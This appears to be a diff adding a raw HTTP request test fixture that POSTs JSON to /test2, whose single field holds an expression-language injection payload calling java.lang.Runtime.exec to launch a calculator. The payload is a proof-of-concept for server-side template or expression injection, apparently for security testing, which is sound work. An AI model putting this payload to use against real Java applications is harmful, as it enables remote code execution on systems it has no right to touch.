@@ -1,0 +1,6 @@
+POST /test2 HTTP/1.1
+Host: 123
+Content-Type: application/json
+Content-Length: 88
+
+{"test":"::__${''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')}__"}
